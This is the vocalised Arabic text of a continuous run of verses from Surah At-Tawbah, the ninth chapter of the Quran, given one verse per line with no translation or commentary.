اِنَّمَا يَعْمُرُ مَسٰجِدَ اللّٰهِ مَنْ اٰمَنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَاَقَامَ الصَّلٰوةَ وَاٰتَى الزَّكٰوةَ وَلَمْ يَخْشَ اِلَّا اللّٰهَ فَعَسٰٓى اُولٰۤىِٕكَ اَنْ يَّكُوْنُوْا مِنَ الْمُهْتَدِيْنَ
اَجَعَلْتُمْ سِقَايَةَ الْحَاۤجِّ وَعِمَارَةَ الْمَسْجِدِ الْحَرَامِ كَمَنْ اٰمَنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَجَاهَدَ فِيْ سَبِيْلِ اللّٰهِ ۗ لَا يَسْتَوٗنَ عِنْدَ اللّٰهِ ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الظّٰلِمِيْنَ
اَلَّذِيْنَ اٰمَنُوْا وَهَاجَرُوْا وَجَاهَدُوْا فِيْ سَبِيْلِ اللّٰهِ بِاَمْوَالِهِمْ وَاَنْفُسِهِمْۙ اَعْظَمُ دَرَجَةً عِنْدَ اللّٰهِ ۗ وَاُولٰۤىِٕكَ هُمُ الْفَاۤىِٕزُوْنَ
يُبَشِّرُهُمْ رَبُّهُمْ بِرَحْمَةٍ مِّنْهُ وَرِضْوَانٍ وَّجَنّٰتٍ لَّهُمْ فِيْهَا نَعِيْمٌ مُّقِيْمٌ
خٰلِدِيْنَ فِيْهَآ اَبَدًا ۗ اِنَّ اللّٰهَ عِنْدَهٗٓ اَجْرٌ عَظِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَتَّخِذُوْٓا اٰبَاۤءَكُمْ وَاِخْوَانَكُمْ اَوْلِيَاۤءَ اِنِ اسْتَحَبُّوا الْكُفْرَ عَلَى الْاِيْمَانِ ۗ وَمَنْ يَّتَوَلَّهُمْ مِّنْكُمْ فَاُولٰۤىِٕكَ هُمُ الظّٰلِمُوْنَ
قُلْ اِنْ كَانَ اٰبَاۤؤُكُمْ وَاَبْنَاۤؤُكُمْ وَاِخْوَانُكُمْ وَاَزْوَاجُكُمْ وَعَشِيْرَتُكُمْ وَاَمْوَالُ اقْتَرَفْتُمُوْهَا وَتِجَارَةٌ تَخْشَوْنَ كَسَادَهَا وَمَسٰكِنُ تَرْضَوْنَهَآ اَحَبَّ اِلَيْكُمْ مِّنَ اللّٰهِ وَرَسُوْلِهٖ وَجِهَادٍ فِيْ سَبِيْلِهٖ فَتَرَبَّصُوْا حَتّٰى يَأْتِيَ اللّٰهُ بِاَمْرِهٖ ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الْفٰسِقِيْنَ
لَقَدْ نَصَرَكُمُ اللّٰهُ فِيْ مَوَاطِنَ كَثِيْرَةٍ ۙ وَّيَوْمَ حُنَيْنٍ ۙ اِذْ اَعْجَبَتْكُمْ كَثْرَتُكُمْ فَلَمْ تُغْنِ عَنْكُمْ شَيْـًٔا وَّضَاقَتْ عَلَيْكُمُ الْاَرْضُ بِمَا رَحُبَتْ ثُمَّ وَلَّيْتُمْ مُّدْبِرِيْنَ
ثُمَّ اَنْزَلَ اللّٰهُ سَكِيْنَتَهٗ عَلٰى رَسُوْلِهٖ وَعَلَى الْمُؤْمِنِيْنَ وَاَنْزَلَ جُنُوْدًا لَّمْ تَرَوْهَا وَعَذَّبَ الَّذِيْنَ كَفَرُوْا ۗ وَذٰلِكَ جَزَاۤءُ الْكٰفِرِيْنَ
ثُمَّ يَتُوْبُ اللّٰهُ مِنْۢ بَعْدِ ذٰلِكَ عَلٰى مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِنَّمَا الْمُشْرِكُوْنَ نَجَسٌ فَلَا يَقْرَبُوا الْمَسْجِدَ الْحَرَامَ بَعْدَ عَامِهِمْ هٰذَا ۚ وَاِنْ خِفْتُمْ عَيْلَةً فَسَوْفَ يُغْنِيْكُمُ اللّٰهُ مِنْ فَضْلِهٖٓ اِنْ شَاۤءَ ۗ اِنَّ اللّٰهَ عَلِيْمٌ حَكِيْمٌ
قَاتِلُوا الَّذِيْنَ لَا يُؤْمِنُوْنَ بِاللّٰهِ وَلَا بِالْيَوْمِ الْاٰخِرِ وَلَا يُحَرِّمُوْنَ مَا حَرَّمَ اللّٰهُ وَرَسُوْلُهٗ وَلَا يَدِيْنُوْنَ دِيْنَ الْحَقِّ مِنَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ حَتّٰى يُعْطُوا الْجِزْيَةَ عَنْ يَّدٍ وَّهُمْ صٰغِرُوْنَ
وَقَالَتِ الْيَهُوْدُ عُزَيْرُ ِۨابْنُ اللّٰهِ وَقَالَتِ النَّصٰرَى الْمَسِيْحُ ابْنُ اللّٰهِ ۗ ذٰلِكَ قَوْلُهُمْ بِاَفْوَاهِهِمْ ۚ يُضَاهِـُٔوْنَ قَوْلَ الَّذِيْنَ كَفَرُوْا مِنْ قَبْلُ ۗ قَاتَلَهُمُ اللّٰهُ ۚ اَنّٰى يُؤْفَكُوْنَ
اتَّخَذُوْٓا اَحْبَارَهُمْ وَرُهْبَانَهُمْ اَرْبَابًا مِّنْ دُوْنِ اللّٰهِ وَالْمَسِيْحَ ابْنَ مَرْيَمَ ۚ وَمَآ اُمِرُوْٓا اِلَّا لِيَعْبُدُوْٓا اِلٰهًا وَّاحِدًا ۚ لَآ اِلٰهَ اِلَّا هُوَ ۗ سُبْحٰنَهٗ عَمَّا يُشْرِكُوْنَ
يُرِيْدُوْنَ اَنْ يُّطْفِـُٔوْا نُوْرَ اللّٰهِ بِاَفْوَاهِهِمْ وَيَأْبَى اللّٰهُ اِلَّآ اَنْ يُّتِمَّ نُوْرَهٗ وَلَوْ كَرِهَ الْكٰفِرُوْنَ
هُوَ الَّذِيْٓ اَرْسَلَ رَسُوْلَهٗ بِالْهُدٰى وَدِيْنِ الْحَقِّ لِيُظْهِرَهٗ عَلَى الدِّيْنِ كُلِّهٖۙ وَلَوْ كَرِهَ الْمُشْرِكُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِنَّ كَثِيْرًا مِّنَ الْاَحْبَارِ وَالرُّهْبَانِ لَيَأْكُلُوْنَ اَمْوَالَ النَّاسِ بِالْبَاطِلِ وَيَصُدُّوْنَ عَنْ سَبِيْلِ اللّٰهِ ۗ وَالَّذِيْنَ يَكْنِزُوْنَ الذَّهَبَ وَالْفِضَّةَ وَلَا يُنْفِقُوْنَهَا فِيْ سَبِيْلِ اللّٰهِ ۙ فَبَشِّرْهُمْ بِعَذَابٍ اَلِيْمٍ
يَّوْمَ يُحْمٰى عَلَيْهَا فِيْ نَارِ جَهَنَّمَ فَتُكْوٰى بِهَا جِبَاهُهُمْ وَجُنُوْبُهُمْ وَظُهُوْرُهُمْ ۚ هٰذَا مَا كَنَزْتُمْ لِاَنْفُسِكُمْ فَذُوْقُوْا مَا كُنْتُمْ تَكْنِزُوْنَ
اِنَّ عِدَّةَ الشُّهُوْرِ عِنْدَ اللّٰهِ اثْنَا عَشَرَ شَهْرًا فِيْ كِتٰبِ اللّٰهِ يَوْمَ خَلَقَ السَّمٰوٰتِ وَالْاَرْضَ مِنْهَآ اَرْبَعَةٌ حُرُمٌ ۗ ذٰلِكَ الدِّيْنُ الْقَيِّمُ ەۙ فَلَا تَظْلِمُوْا فِيْهِنَّ اَنْفُسَكُمْ ۗ وَقَاتِلُوا الْمُشْرِكِيْنَ كَاۤفَّةً كَمَا يُقَاتِلُوْنَكُمْ كَاۤفَّةً ۗ وَاعْلَمُوْٓا اَنَّ اللّٰهَ مَعَ الْمُتَّقِيْنَ
اِنَّمَا النَّسِيْۤءُ زِيَادَةٌ فِى الْكُفْرِ يُضَلُّ بِهِ الَّذِيْنَ كَفَرُوْا يُحِلُّوْنَهٗ عَامًا وَّيُحَرِّمُوْنَهٗ عَامًا لِّيُوَاطِـُٔوْا عِدَّةَ مَا حَرَّمَ اللّٰهُ فَيُحِلُّوْا مَا حَرَّمَ اللّٰهُ ۗ زُيِّنَ لَهُمْ سُوْۤءُ اَعْمَالِهِمْ ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الْكٰفِرِيْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا مَا لَكُمْ اِذَا قِيْلَ لَكُمُ انْفِرُوْا فِيْ سَبِيْلِ اللّٰهِ اثَّاقَلْتُمْ اِلَى الْاَرْضِ ۗ اَرَضِيْتُمْ بِالْحَيٰوةِ الدُّنْيَا مِنَ الْاٰخِرَةِ ۚ فَمَا مَتَاعُ الْحَيٰوةِ الدُّنْيَا فِى الْاٰخِرَةِ اِلَّا قَلِيْلٌ
اِلَّا تَنْفِرُوْا يُعَذِّبْكُمْ عَذَابًا اَلِيْمًا ۙ وَّيَسْتَبْدِلْ قَوْمًا غَيْرَكُمْ وَلَا تَضُرُّوْهُ شَيْـًٔا ۗ وَاللّٰهُ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
اِلَّا تَنْصُرُوْهُ فَقَدْ نَصَرَهُ اللّٰهُ اِذْ اَخْرَجَهُ الَّذِيْنَ كَفَرُوْا ثَانِيَ اثْنَيْنِ اِذْ هُمَا فِى الْغَارِ اِذْ يَقُوْلُ لِصَاحِبِهٖ لَا تَحْزَنْ اِنَّ اللّٰهَ مَعَنَا ۚ فَاَنْزَلَ اللّٰهُ سَكِيْنَتَهٗ عَلَيْهِ وَاَيَّدَهٗ بِجُنُوْدٍ لَّمْ تَرَوْهَا وَجَعَلَ كَلِمَةَ الَّذِيْنَ كَفَرُوا السُّفْلٰى ۗ وَكَلِمَةُ اللّٰهِ هِيَ الْعُلْيَا ۗ وَاللّٰهُ عَزِيْزٌ حَكِيْمٌ
اِنْفِرُوْا خِفَافًا وَّثِقَالًا وَّجَاهِدُوْا بِاَمْوَالِكُمْ وَاَنْفُسِكُمْ فِيْ سَبِيْلِ اللّٰهِ ۗ ذٰلِكُمْ خَيْرٌ لَّكُمْ اِنْ كُنْتُمْ تَعْلَمُوْنَ
لَوْ كَانَ عَرَضًا قَرِيْبًا وَّسَفَرًا قَاصِدًا لَّاتَّبَعُوْكَ وَلٰكِنْۢ بَعُدَتْ عَلَيْهِمُ الشُّقَّةُ ۗ وَسَيَحْلِفُوْنَ بِاللّٰهِ لَوِ اسْتَطَعْنَا لَخَرَجْنَا مَعَكُمْ ۚ يُهْلِكُوْنَ اَنْفُسَهُمْ ۚ وَاللّٰهُ يَعْلَمُ اِنَّهُمْ لَكٰذِبُوْنَ
عَفَا اللّٰهُ عَنْكَ ۚ لِمَ اَذِنْتَ لَهُمْ حَتّٰى يَتَبَيَّنَ لَكَ الَّذِيْنَ صَدَقُوْا وَتَعْلَمَ الْكٰذِبِيْنَ
لَا يَسْتَأْذِنُكَ الَّذِيْنَ يُؤْمِنُوْنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ اَنْ يُّجَاهِدُوْا بِاَمْوَالِهِمْ وَاَنْفُسِهِمْ ۗ وَاللّٰهُ عَلِيْمٌۢ بِالْمُتَّقِيْنَ
اِنَّمَا يَسْتَأْذِنُكَ الَّذِيْنَ لَا يُؤْمِنُوْنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَارْتَابَتْ قُلُوْبُهُمْ فَهُمْ فِيْ رَيْبِهِمْ يَتَرَدَّدُوْنَ
وَلَوْ اَرَادُوا الْخُرُوْجَ لَاَعَدُّوْا لَهٗ عُدَّةً وَّلٰكِنْ كَرِهَ اللّٰهُ انْۢبِعَاثَهُمْ فَثَبَّطَهُمْ وَقِيْلَ اقْعُدُوْا مَعَ الْقٰعِدِيْنَ
لَوْ خَرَجُوْا فِيْكُمْ مَّا زَادُوْكُمْ اِلَّا خَبَالًا وَّلَاَوْضَعُوْا خِلٰلَكُمْ يَبْغُوْنَكُمُ الْفِتْنَةَ ۚ وَفِيْكُمْ سَمّٰعُوْنَ لَهُمْ ۗ وَاللّٰهُ عَلِيْمٌۢ بِالظّٰلِمِيْنَ
لَقَدِ ابْتَغَوُا الْفِتْنَةَ مِنْ قَبْلُ وَقَلَّبُوْا لَكَ الْاُمُوْرَ حَتّٰى جَاۤءَ الْحَقُّ وَظَهَرَ اَمْرُ اللّٰهِ وَهُمْ كٰرِهُوْنَ
وَمِنْهُمْ مَّنْ يَّقُوْلُ ائْذَنْ لِّيْ وَلَا تَفْتِنِّيْ ۗ اَلَا فِى الْفِتْنَةِ سَقَطُوْا ۗ وَاِنَّ جَهَنَّمَ لَمُحِيْطَةٌ ۢ بِالْكٰفِرِيْنَ
اِنْ تُصِبْكَ حَسَنَةٌ تَسُؤْهُمْ ۖ وَاِنْ تُصِبْكَ مُصِيْبَةٌ يَّقُوْلُوْا قَدْ اَخَذْنَآ اَمْرَنَا مِنْ قَبْلُ وَيَتَوَلَّوْا وَّهُمْ فَرِحُوْنَ
قُلْ لَّنْ يُّصِيْبَنَآ اِلَّا مَا كَتَبَ اللّٰهُ لَنَا ۚ هُوَ مَوْلٰىنَا ۚ وَعَلَى اللّٰهِ فَلْيَتَوَكَّلِ الْمُؤْمِنُوْنَ
قُلْ هَلْ تَرَبَّصُوْنَ بِنَآ اِلَّآ اِحْدَى الْحُسْنَيَيْنِ ۗ وَنَحْنُ نَتَرَبَّصُ بِكُمْ اَنْ يُّصِيْبَكُمُ اللّٰهُ بِعَذَابٍ مِّنْ عِنْدِهٖٓ اَوْ بِاَيْدِيْنَا ۖ فَتَرَبَّصُوْٓا اِنَّا مَعَكُمْ مُّتَرَبِّصُوْنَ
قُلْ اَنْفِقُوْا طَوْعًا اَوْ كَرْهًا لَّنْ يُّتَقَبَّلَ مِنْكُمْ ۗ اِنَّكُمْ كُنْتُمْ قَوْمًا فٰسِقِيْنَ
وَمَا مَنَعَهُمْ اَنْ تُقْبَلَ مِنْهُمْ نَفَقٰتُهُمْ اِلَّآ اَنَّهُمْ كَفَرُوْا بِاللّٰهِ وَبِرَسُوْلِهٖ وَلَا يَأْتُوْنَ الصَّلٰوةَ اِلَّا وَهُمْ كُسَالٰى وَلَا يُنْفِقُوْنَ اِلَّا وَهُمْ كٰرِهُوْنَ
فَلَا تُعْجِبْكَ اَمْوَالُهُمْ وَلَآ اَوْلَادُهُمْ ۗ اِنَّمَا يُرِيْدُ اللّٰهُ لِيُعَذِّبَهُمْ بِهَا فِى الْحَيٰوةِ الدُّنْيَا وَتَزْهَقَ اَنْفُسُهُمْ وَهُمْ كٰفِرُوْنَ
وَيَحْلِفُوْنَ بِاللّٰهِ اِنَّهُمْ لَمِنْكُمْ ۗ وَمَا هُمْ مِّنْكُمْ وَلٰكِنَّهُمْ قَوْمٌ يَّفْرَقُوْنَ
لَوْ يَجِدُوْنَ مَلْجَـًٔا اَوْ مَغٰرٰتٍ اَوْ مُدَّخَلًا لَّوَلَّوْا اِلَيْهِ وَهُمْ يَجْمَحُوْنَ
وَمِنْهُمْ مَّنْ يَّلْمِزُكَ فِى الصَّدَقٰتِ ۚ فَاِنْ اُعْطُوْا مِنْهَا رَضُوْا وَاِنْ لَّمْ يُعْطَوْا مِنْهَآ اِذَا هُمْ يَسْخَطُوْنَ
وَلَوْ اَنَّهُمْ رَضُوْا مَآ اٰتٰىهُمُ اللّٰهُ وَرَسُوْلُهٗ ۙ وَقَالُوْا حَسْبُنَا اللّٰهُ سَيُؤْتِيْنَا اللّٰهُ مِنْ فَضْلِهٖ وَرَسُوْلُهٗٓ ۙ اِنَّآ اِلَى اللّٰهِ رٰغِبُوْنَ
اِنَّمَا الصَّدَقٰتُ لِلْفُقَرَاۤءِ وَالْمَسٰكِيْنِ وَالْعٰمِلِيْنَ عَلَيْهَا وَالْمُؤَلَّفَةِ قُلُوْبُهُمْ وَفِى الرِّقَابِ وَالْغٰرِمِيْنَ وَفِيْ سَبِيْلِ اللّٰهِ وَابْنِ السَّبِيْلِ ۗ فَرِيْضَةً مِّنَ اللّٰهِ ۗ وَاللّٰهُ عَلِيْمٌ حَكِيْمٌ
وَمِنْهُمُ الَّذِيْنَ يُؤْذُوْنَ النَّبِيَّ وَيَقُوْلُوْنَ هُوَ اُذُنٌ ۗ قُلْ اُذُنُ خَيْرٍ لَّكُمْ يُؤْمِنُ بِاللّٰهِ وَيُؤْمِنُ لِلْمُؤْمِنِيْنَ وَرَحْمَةٌ لِّلَّذِيْنَ اٰمَنُوْا مِنْكُمْ ۗ وَالَّذِيْنَ يُؤْذُوْنَ رَسُوْلَ اللّٰهِ لَهُمْ عَذَابٌ اَلِيْمٌ
يَحْلِفُوْنَ بِاللّٰهِ لَكُمْ لِيُرْضُوْكُمْ ۚ وَاللّٰهُ وَرَسُوْلُهٗٓ اَحَقُّ اَنْ يُّرْضُوْهُ اِنْ كَانُوْا مُؤْمِنِيْنَ
اَلَمْ يَعْلَمُوْٓا اَنَّهٗ مَنْ يُّحَادِدِ اللّٰهَ وَرَسُوْلَهٗ فَاَنَّ لَهٗ نَارَ جَهَنَّمَ خَالِدًا فِيْهَا ۗ ذٰلِكَ الْخِزْيُ الْعَظِيْمُ
يَحْذَرُ الْمُنٰفِقُوْنَ اَنْ تُنَزَّلَ عَلَيْهِمْ سُوْرَةٌ تُنَبِّئُهُمْ بِمَا فِيْ قُلُوْبِهِمْ ۗ قُلِ اسْتَهْزِءُوْا ۚ اِنَّ اللّٰهَ مُخْرِجٌ مَّا تَحْذَرُوْنَ
وَلَىِٕنْ سَاَلْتَهُمْ لَيَقُوْلُنَّ اِنَّمَا كُنَّا نَخُوْضُ وَنَلْعَبُ ۗ قُلْ اَبِاللّٰهِ وَاٰيٰتِهٖ وَرَسُوْلِهٖ كُنْتُمْ تَسْتَهْزِءُوْنَ
لَا تَعْتَذِرُوْا قَدْ كَفَرْتُمْ بَعْدَ اِيْمَانِكُمْ ۗ اِنْ نَّعْفُ عَنْ طَاۤىِٕفَةٍ مِّنْكُمْ نُعَذِّبْ طَاۤىِٕفَةًۢ بِاَنَّهُمْ كَانُوْا مُجْرِمِيْنَ
اَلْمُنٰفِقُوْنَ وَالْمُنٰفِقٰتُ بَعْضُهُمْ مِّنْۢ بَعْضٍ ۘ يَأْمُرُوْنَ بِالْمُنْكَرِ وَيَنْهَوْنَ عَنِ الْمَعْرُوْفِ وَيَقْبِضُوْنَ اَيْدِيَهُمْ ۗ نَسُوا اللّٰهَ فَنَسِيَهُمْ ۗ اِنَّ الْمُنٰفِقِيْنَ هُمُ الْفٰسِقُوْنَ
وَعَدَ اللّٰهُ الْمُنٰفِقِيْنَ وَالْمُنٰفِقٰتِ وَالْكُفَّارَ نَارَ جَهَنَّمَ خٰلِدِيْنَ فِيْهَا ۗ هِيَ حَسْبُهُمْ ۚ وَلَعَنَهُمُ اللّٰهُ ۚ وَلَهُمْ عَذَابٌ مُّقِيْمٌ
كَالَّذِيْنَ مِنْ قَبْلِكُمْ كَانُوْٓا اَشَدَّ مِنْكُمْ قُوَّةً وَّاَكْثَرَ اَمْوَالًا وَّاَوْلَادًا ۚ فَاسْتَمْتَعُوْا بِخَلَاقِهِمْ فَاسْتَمْتَعْتُمْ بِخَلَاقِكُمْ كَمَا اسْتَمْتَعَ الَّذِيْنَ مِنْ قَبْلِكُمْ بِخَلَاقِهِمْ وَخُضْتُمْ كَالَّذِيْ خَاضُوْا ۗ اُولٰۤىِٕكَ حَبِطَتْ اَعْمَالُهُمْ فِى الدُّنْيَا وَالْاٰخِرَةِ ۚ وَاُولٰۤىِٕكَ هُمُ الْخٰسِرُوْنَ
اَلَمْ يَأْتِهِمْ نَبَاُ الَّذِيْنَ مِنْ قَبْلِهِمْ قَوْمِ نُوْحٍ وَّعَادٍ وَّثَمُوْدَ ۙ وَقَوْمِ اِبْرٰهِيْمَ وَاَصْحٰبِ مَدْيَنَ وَالْمُؤْتَفِكٰتِ ۗ اَتَتْهُمْ رُسُلُهُمْ بِالْبَيِّنٰتِ ۚ فَمَا كَانَ اللّٰهُ لِيَظْلِمَهُمْ وَلٰكِنْ كَانُوْٓا اَنْفُسَهُمْ يَظْلِمُوْنَ
وَالْمُؤْمِنُوْنَ وَالْمُؤْمِنٰتُ بَعْضُهُمْ اَوْلِيَاۤءُ بَعْضٍ ۘ يَأْمُرُوْنَ بِالْمَعْرُوْفِ وَيَنْهَوْنَ عَنِ الْمُنْكَرِ وَيُقِيْمُوْنَ الصَّلٰوةَ وَيُؤْتُوْنَ الزَّكٰوةَ وَيُطِيْعُوْنَ اللّٰهَ وَرَسُوْلَهٗ ۗ اُولٰۤىِٕكَ سَيَرْحَمُهُمُ اللّٰهُ ۗ اِنَّ اللّٰهَ عَزِيْزٌ حَكِيْمٌ
وَعَدَ اللّٰهُ الْمُؤْمِنِيْنَ وَالْمُؤْمِنٰتِ جَنّٰتٍ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَا ۚ وَمَسٰكِنَ طَيِّبَةً فِيْ جَنّٰتِ عَدْنٍ ۗ وَرِضْوَانٌ مِّنَ اللّٰهِ اَكْبَرُ ۗ ذٰلِكَ هُوَ الْفَوْزُ الْعَظِيْمُ
يٰٓاَيُّهَا النَّبِيُّ جَاهِدِ الْكُفَّارَ وَالْمُنٰفِقِيْنَ وَاغْلُظْ عَلَيْهِمْ ۗ وَمَأْوٰىهُمْ جَهَنَّمُ ۗ وَبِئْسَ الْمَصِيْرُ
يَحْلِفُوْنَ بِاللّٰهِ مَا قَالُوْا ۗ وَلَقَدْ قَالُوْا كَلِمَةَ الْكُفْرِ وَكَفَرُوْا بَعْدَ اِسْلَامِهِمْ وَهَمُّوْا بِمَا لَمْ يَنَالُوْا ۚ وَمَا نَقَمُوْٓا اِلَّآ اَنْ اَغْنٰىهُمُ اللّٰهُ وَرَسُوْلُهٗ مِنْ فَضْلِهٖ ۚ فَاِنْ يَّتُوْبُوْا يَكُ خَيْرًا لَّهُمْ ۚ وَاِنْ يَّتَوَلَّوْا يُعَذِّبْهُمُ اللّٰهُ عَذَابًا اَلِيْمًا فِى الدُّنْيَا وَالْاٰخِرَةِ ۚ وَمَا لَهُمْ فِى الْاَرْضِ مِنْ وَّلِيٍّ وَّلَا نَصِيْرٍ
وَمِنْهُمْ مَّنْ عَاهَدَ اللّٰهَ لَىِٕنْ اٰتٰىنَا مِنْ فَضْلِهٖ لَنَصَّدَّقَنَّ وَلَنَكُوْنَنَّ مِنَ الصّٰلِحِيْنَ
فَلَمَّآ اٰتٰىهُمْ مِّنْ فَضْلِهٖ بَخِلُوْا بِهٖ وَتَوَلَّوْا وَّهُمْ مُّعْرِضُوْنَ
فَاَعْقَبَهُمْ نِفَاقًا فِيْ قُلُوْبِهِمْ اِلٰى يَوْمِ يَلْقَوْنَهٗ بِمَآ اَخْلَفُوا اللّٰهَ مَا وَعَدُوْهُ وَبِمَا كَانُوْا يَكْذِبُوْنَ
اَلَمْ يَعْلَمُوْٓا اَنَّ اللّٰهَ يَعْلَمُ سِرَّهُمْ وَنَجْوٰىهُمْ وَاَنَّ اللّٰهَ عَلَّامُ الْغُيُوْبِ
اَلَّذِيْنَ يَلْمِزُوْنَ الْمُطَّوِّعِيْنَ مِنَ الْمُؤْمِنِيْنَ فِى الصَّدَقٰتِ وَالَّذِيْنَ لَا يَجِدُوْنَ اِلَّا جُهْدَهُمْ فَيَسْخَرُوْنَ مِنْهُمْ ۗ سَخِرَ اللّٰهُ مِنْهُمْ ۖ وَلَهُمْ عَذَابٌ اَلِيْمٌ
اِسْتَغْفِرْ لَهُمْ اَوْ لَا تَسْتَغْفِرْ لَهُمْ ۗ اِنْ تَسْتَغْفِرْ لَهُمْ سَبْعِيْنَ مَرَّةً فَلَنْ يَّغْفِرَ اللّٰهُ لَهُمْ ۗ ذٰلِكَ بِاَنَّهُمْ كَفَرُوْا بِاللّٰهِ وَرَسُوْلِهٖ ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الْفٰسِقِيْنَ
فَرِحَ الْمُخَلَّفُوْنَ بِمَقْعَدِهِمْ خِلٰفَ رَسُوْلِ اللّٰهِ وَكَرِهُوْٓا اَنْ يُّجَاهِدُوْا بِاَمْوَالِهِمْ وَاَنْفُسِهِمْ فِيْ سَبِيْلِ اللّٰهِ وَقَالُوْا لَا تَنْفِرُوْا فِى الْحَرِّ ۗ قُلْ نَارُ جَهَنَّمَ اَشَدُّ حَرًّا ۗ لَوْ كَانُوْا يَفْقَهُوْنَ
فَلْيَضْحَكُوْا قَلِيْلًا وَّلْيَبْكُوْا كَثِيْرًا ۚ جَزَاۤءً بِمَا كَانُوْا يَكْسِبُوْنَ
فَاِنْ رَّجَعَكَ اللّٰهُ اِلٰى طَاۤىِٕفَةٍ مِّنْهُمْ فَاسْتَأْذَنُوْكَ لِلْخُرُوْجِ فَقُلْ لَّنْ تَخْرُجُوْا مَعِيَ اَبَدًا وَّلَنْ تُقَاتِلُوْا مَعِيَ عَدُوًّا ۗ اِنَّكُمْ رَضِيْتُمْ بِالْقُعُوْدِ اَوَّلَ مَرَّةٍ فَاقْعُدُوْا مَعَ الْخٰلِفِيْنَ
وَلَا تُصَلِّ عَلٰٓى اَحَدٍ مِّنْهُمْ مَّاتَ اَبَدًا وَّلَا تَقُمْ عَلٰى قَبْرِهٖ ۗ اِنَّهُمْ كَفَرُوْا بِاللّٰهِ وَرَسُوْلِهٖ وَمَاتُوْا وَهُمْ فٰسِقُوْنَ
وَلَا تُعْجِبْكَ اَمْوَالُهُمْ وَاَوْلَادُهُمْ ۗ اِنَّمَا يُرِيْدُ اللّٰهُ اَنْ يُّعَذِّبَهُمْ بِهَا فِى الدُّنْيَا وَتَزْهَقَ اَنْفُسُهُمْ وَهُمْ كٰفِرُوْنَ
وَاِذَآ اُنْزِلَتْ سُوْرَةٌ اَنْ اٰمِنُوْا بِاللّٰهِ وَجَاهِدُوْا مَعَ رَسُوْلِهٖ اسْتَأْذَنَكَ اُولُوا الطَّوْلِ مِنْهُمْ وَقَالُوْا ذَرْنَا نَكُنْ مَّعَ الْقٰعِدِيْنَ
رَضُوْا بِاَنْ يَّكُوْنُوْا مَعَ الْخَوَالِفِ وَطُبِعَ عَلٰى قُلُوْبِهِمْ فَهُمْ لَا يَفْقَهُوْنَ
لٰكِنِ الرَّسُوْلُ وَالَّذِيْنَ اٰمَنُوْا مَعَهٗ جَاهَدُوْا بِاَمْوَالِهِمْ وَاَنْفُسِهِمْ ۚ وَاُولٰۤىِٕكَ لَهُمُ الْخَيْرٰتُ ۚ وَاُولٰۤىِٕكَ هُمُ الْمُفْلِحُوْنَ
اَعَدَّ اللّٰهُ لَهُمْ جَنّٰتٍ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَا ۗ ذٰلِكَ الْفَوْزُ الْعَظِيْمُ
وَجَاۤءَ الْمُعَذِّرُوْنَ مِنَ الْاَعْرَابِ لِيُؤْذَنَ لَهُمْ وَقَعَدَ الَّذِيْنَ كَذَبُوا اللّٰهَ وَرَسُوْلَهٗ ۗ سَيُصِيْبُ الَّذِيْنَ كَفَرُوْا مِنْهُمْ عَذَابٌ اَلِيْمٌ
لَيْسَ عَلَى الضُّعَفَاۤءِ وَلَا عَلَى الْمَرْضٰى وَلَا عَلَى الَّذِيْنَ لَا يَجِدُوْنَ مَا يُنْفِقُوْنَ حَرَجٌ اِذَا نَصَحُوْا لِلّٰهِ وَرَسُوْلِهٖ ۗ مَا عَلَى الْمُحْسِنِيْنَ مِنْ سَبِيْلٍ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
وَّلَا عَلَى الَّذِيْنَ اِذَا مَآ اَتَوْكَ لِتَحْمِلَهُمْ قُلْتَ لَآ اَجِدُ مَآ اَحْمِلُكُمْ عَلَيْهِ ۖ تَوَلَّوْا وَّاَعْيُنُهُمْ تَفِيْضُ مِنَ الدَّمْعِ حَزَنًا اَلَّا يَجِدُوْا مَا يُنْفِقُوْنَ
اِنَّمَا السَّبِيْلُ عَلَى الَّذِيْنَ يَسْتَأْذِنُوْنَكَ وَهُمْ اَغْنِيَاۤءُ ۚ رَضُوْا بِاَنْ يَّكُوْنُوْا مَعَ الْخَوَالِفِ ۙ وَطَبَعَ اللّٰهُ عَلٰى قُلُوْبِهِمْ فَهُمْ لَا يَعْلَمُوْنَ
يَعْتَذِرُوْنَ اِلَيْكُمْ اِذَا رَجَعْتُمْ اِلَيْهِمْ ۗ قُلْ لَّا تَعْتَذِرُوْا لَنْ نُّؤْمِنَ لَكُمْ قَدْ نَبَّاَنَا اللّٰهُ مِنْ اَخْبَارِكُمْ ۗ وَسَيَرَى اللّٰهُ عَمَلَكُمْ وَرَسُوْلُهٗ ثُمَّ تُرَدُّوْنَ اِلٰى عَالِمِ الْغَيْبِ وَالشَّهَادَةِ فَيُنَبِّئُكُمْ بِمَا كُنْتُمْ تَعْمَلُوْنَ
سَيَحْلِفُوْنَ بِاللّٰهِ لَكُمْ اِذَا انْقَلَبْتُمْ اِلَيْهِمْ لِتُعْرِضُوْا عَنْهُمْ ۗ فَاَعْرِضُوْا عَنْهُمْ ۗ اِنَّهُمْ رِجْسٌ ۖ وَّمَأْوٰىهُمْ جَهَنَّمُ ۚ جَزَاۤءًۢ بِمَا كَانُوْا يَكْسِبُوْنَ
يَحْلِفُوْنَ لَكُمْ لِتَرْضَوْا عَنْهُمْ ۚ فَاِنْ تَرْضَوْا عَنْهُمْ فَاِنَّ اللّٰهَ لَا يَرْضٰى عَنِ الْقَوْمِ الْفٰسِقِيْنَ
